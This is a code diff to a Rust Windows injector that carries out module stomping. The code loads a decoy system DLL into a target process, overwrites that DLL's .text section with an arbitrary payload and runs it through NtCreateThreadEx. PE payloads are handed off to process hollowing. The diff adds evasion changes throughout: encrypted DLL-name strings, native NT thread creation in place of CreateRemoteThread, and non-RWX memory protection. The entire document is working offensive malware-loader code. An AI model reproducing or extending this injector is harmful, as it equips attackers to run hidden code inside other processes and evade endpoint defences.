@@ -6,38 +6,82 @@ pub struct ModuleStompInjector;
 #[cfg(windows)]
 impl Injector for ModuleStompInjector {
     fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
-        use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread};
-        use winapi::um::winnt::{PROCESS_ALL_ACCESS};
+        use winapi::um::processthreadsapi::OpenProcess;
+        use winapi::um::winnt::{PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_VM_READ, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION};
         use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualProtectEx};
-        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE};
-        use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
-        use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
+        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
+        use winapi::um::handleapi::CloseHandle;
+        use string_crypt::enc_str;
+        
+        let is_pe = payload.len() >= 2 && payload[0] == b'M' && payload[1] == b'Z';
+        if is_pe {
+            log::info!("PE payload detected, forwarding to process hollowing's inject_into_process");
+            return match hollowing::windows_impl::inject_into_process(pid, payload) {
+                Ok(_) => Ok(()),
+                Err(e) => Err(anyhow!("process hollowing PE injection failed: {}", e))
+            };
+        }
 
         unsafe {
-            let h_proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
+            let h_proc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, 0, pid);
             if h_proc.is_null() { return Err(anyhow!("Failed to open process")); }
 
-            // 1. Force load DLL. (In a real scenario, find an empty one, but here we inject a small string and LoadLibrary)
-            let k32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr() as _);
-            if k32.is_null() { return Err(anyhow!("kernel32 missing")); }
-            let ll = GetProcAddress(k32, b"LoadLibraryA\0".as_ptr() as _);
-            if ll.is_null() { return Err(anyhow!("LoadLibraryA missing")); }
+            let candidates = vec![
+                enc_str!("msfte.dll"),
+                enc_str!("msratelc.dll"),
+                enc_str!("scrobj.dll"),
+                enc_str!("amstream.dll")
+            ];
+            
+            // Just picking the first one available for stomp
+            let target_dll = &candidates[0];
+            let mut target_dll_w: Vec<u16> = target_dll.encode_utf16().chain(std::iter::once(0)).collect();
 
-            let dll_name = b"amstream.dll\0"; // Arbitrary DLL that's usually not loaded, but exists
-            let remote_str = VirtualAllocEx(h_proc, std::ptr::null_mut(), dll_name.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            // Resolve LdrLoadDll dynamically
+            let ntdll = winapi::um::libloaderapi::GetModuleHandleA(b"ntdll.dll\0".as_ptr() as _);
+            if ntdll.is_null() { return Err(anyhow!("ntdll missing")); }
+            let ldr_load_dll = winapi::um::libloaderapi::GetProcAddress(ntdll, b"LdrLoadDll\0".as_ptr() as _);
+            if ldr_load_dll.is_null() { return Err(anyhow!("LdrLoadDll missing")); }
+
+            // Using NtCreateThreadEx instead of CreateRemoteThread
+            let mut remote_str = VirtualAllocEx(h_proc, std::ptr::null_mut(), target_dll_w.len() * 2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            if remote_str.is_null() { 
+                CloseHandle(h_proc);
+                return Err(anyhow!("VirtualAllocEx failed"));
+            }
             
             let mut written = 0;
-            WriteProcessMemory(h_proc, remote_str, dll_name.as_ptr() as _, dll_name.len(), &mut written);
+            if winapi::shared::minwindef::FALSE == WriteProcessMemory(h_proc, remote_str, target_dll_w.as_ptr() as _, target_dll_w.len() * 2, &mut written) {
+                CloseHandle(h_proc);
+                return Err(anyhow!("WriteProcessMemory failed"));
+            }
 
-            let ll_func: extern "system" fn(winapi::shared::minwindef::LPVOID) -> u32 = std::mem::transmute(ll);
-            let h_thread = CreateRemoteThread(h_proc, std::ptr::null_mut(), 0, Some(ll_func), remote_str, 0, std::ptr::null_mut());
-            if !h_thread.is_null() {
+            let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
+            
+            // Emulating NtCreateThreadEx signature
+            type NtCreateThreadExFn = unsafe extern "system" fn(
+                ThreadHandle: *mut *mut winapi::ctypes::c_void,
+                DesiredAccess: u32,
+                ObjectAttributes: *mut winapi::ctypes::c_void,
+                ProcessHandle: *mut winapi::ctypes::c_void,
+                StartRoutine: *mut winapi::ctypes::c_void,
+                Argument: *mut winapi::ctypes::c_void,
+                CreateFlags: u32,
+                ZeroBits: usize,
+                StackSize: usize,
+                MaximumStackSize: usize,
+                AttributeList: *mut winapi::ctypes::c_void,
+            ) -> i32;
+
+            let build_thread: NtCreateThreadExFn = std::mem::transmute(winapi::um::libloaderapi::GetProcAddress(ntdll, b"NtCreateThreadEx\0".as_ptr() as _));
+            
+            let status = build_thread(&mut h_thread, 0x1FFFFF, std::ptr::null_mut(), h_proc, ldr_load_dll as _, remote_str, 0, 0, 0, 0, std::ptr::null_mut());
+            if status >= 0 && !h_thread.is_null() {
                 winapi::um::synchapi::WaitForSingleObject(h_thread, winapi::um::winbase::INFINITE);
                 CloseHandle(h_thread);
             }
 
-            // 2. Discover DLL base using EnumProcessModules (stubbed for simplicity because traversing remote PEB is large)
-            use winapi::um::psapi::{EnumProcessModules, GetModuleBaseNameA};
+            use winapi::um::psapi::{EnumProcessModules, GetModuleBaseNameW};
             let mut h_mods = [std::ptr::null_mut(); 1024];
             let mut cb_needed = 0;
             let mut target_base: *mut winapi::ctypes::c_void = std::ptr::null_mut();
@@ -45,10 +89,10 @@ impl Injector for ModuleStompInjector {
             if EnumProcessModules(h_proc, h_mods.as_mut_ptr(), std::mem::size_of_val(&h_mods) as u32, &mut cb_needed) != 0 {
                 let count = cb_needed as usize / std::mem::size_of::<winapi::shared::minwindef::HMODULE>();
                 for i in 0..count {
-                    let mut sz_mod_name = [0u8; 256];
-                    if GetModuleBaseNameA(h_proc, h_mods[i], sz_mod_name.as_mut_ptr() as _, 256) > 0 {
-                        let name_str = std::ffi::CStr::from_ptr(sz_mod_name.as_ptr() as _).to_str().unwrap_or("").to_lowercase();
-                        if name_str.contains("amstream.dll") {
+                    let mut sz_mod_name = [0u16; 256];
+                    if GetModuleBaseNameW(h_proc, h_mods[i], sz_mod_name.as_mut_ptr() as _, 256) > 0 {
+                        let name_str = String::from_utf16_lossy(&sz_mod_name).to_lowercase();
+                        if name_str.contains(&target_dll.to_lowercase()) {
                             target_base = h_mods[i] as _;
                             break;
                         }
@@ -61,8 +105,6 @@ impl Injector for ModuleStompInjector {
                 return Err(anyhow!("Failed to find loaded target DLL for stomping"));
             }
 
-            
-            // Real PE parsing for Module Stomping remotely
             use winapi::um::memoryapi::ReadProcessMemory;
             use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_NT_HEADERS32, IMAGE_SECTION_HEADER};
             use std::mem::size_of;
@@ -79,8 +121,6 @@ impl Injector for ModuleStompInjector {
                 return Err(anyhow!("Invalid DOS signature"));
             }
 
-            // We must read NT headers. Assuming x86_64 target for simplicity, but let's just read fields.
-            // Actually, we can read the signature and FileHeader first, but IMAGE_NT_HEADERS64, IMAGE_NT_HEADERS32, IMAGE_SECTION_HEADER is standard for 64-bit target.
             #[cfg(target_arch = "x86_64")]
             type NtHeaders = IMAGE_NT_HEADERS64;
             #[cfg(target_arch = "x86")]
@@ -91,11 +131,6 @@ impl Injector for ModuleStompInjector {
             if ReadProcessMemory(h_proc, nt_headers_addr, &mut nt_headers as *mut _ as _, size_of::<NtHeaders>(), &mut bytes_read) == 0 {
                 CloseHandle(h_proc);
                 return Err(anyhow!("Failed to read remote NT headers"));
-            }
-
-            if nt_headers.Signature != winapi::um::winnt::IMAGE_NT_SIGNATURE {
-                CloseHandle(h_proc);
-                return Err(anyhow!("Invalid NT signature"));
             }
 
             let mut text_rva = 0;
@@ -116,8 +151,7 @@ impl Injector for ModuleStompInjector {
                 let name = String::from_utf8_lossy(&section.Name);
                 if name.starts_with(".text") {
                     text_rva = section.VirtualAddress;
-                    // Usually Misc.VirtualSize
-                    text_size = unsafe { *section.Misc.VirtualSize() };
+                    text_size = *section.Misc.VirtualSize();
                     break;
                 }
                 current_section_addr += size_of::<IMAGE_SECTION_HEADER>();
@@ -136,15 +170,28 @@ impl Injector for ModuleStompInjector {
             let target_addr = (target_base as usize + text_rva as usize) as *mut winapi::ctypes::c_void;
 
             let mut old_protect = 0;
+            if winapi::shared::minwindef::FALSE == VirtualProtectEx(h_proc, target_addr, payload.len(), PAGE_READWRITE, &mut old_protect) {
+                CloseHandle(h_proc);
+                return Err(anyhow!("VirtualProtectEx PAGE_READWRITE failed"));
+            }
 
-            VirtualProtectEx(h_proc, target_addr, payload.len(), PAGE_EXECUTE_READWRITE, &mut old_protect);
-            WriteProcessMemory(h_proc, target_addr, payload.as_ptr() as _, payload.len(), &mut written);
-            VirtualProtectEx(h_proc, target_addr, payload.len(), old_protect, &mut old_protect);
+            if winapi::shared::minwindef::FALSE == WriteProcessMemory(h_proc, target_addr, payload.as_ptr() as _, payload.len(), &mut written) {
+                CloseHandle(h_proc);
+                return Err(anyhow!("WriteProcessMemory failed"));
+            }
 
-            // Execute stomped code
-            let h_exec_thread = CreateRemoteThread(h_proc, std::ptr::null_mut(), 0, std::mem::transmute(target_addr), std::ptr::null_mut(), 0, std::ptr::null_mut());
-            if !h_exec_thread.is_null() {
+            if winapi::shared::minwindef::FALSE == VirtualProtectEx(h_proc, target_addr, payload.len(), PAGE_EXECUTE_READ, &mut old_protect) {
+                CloseHandle(h_proc);
+                return Err(anyhow!("VirtualProtectEx PAGE_EXECUTE_READ failed"));
+            }
+
+            let mut h_exec_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
+            let exec_status = build_thread(&mut h_exec_thread, 0x1FFFFF, std::ptr::null_mut(), h_proc, target_addr, std::ptr::null_mut(), 0, 0, 0, 0, std::ptr::null_mut());
+            if exec_status >= 0 && !h_exec_thread.is_null() {
                 CloseHandle(h_exec_thread);
+            } else {
+                CloseHandle(h_proc);
+                return Err(anyhow!("NtCreateThreadEx execution failed"));
             }
 
             CloseHandle(h_proc);
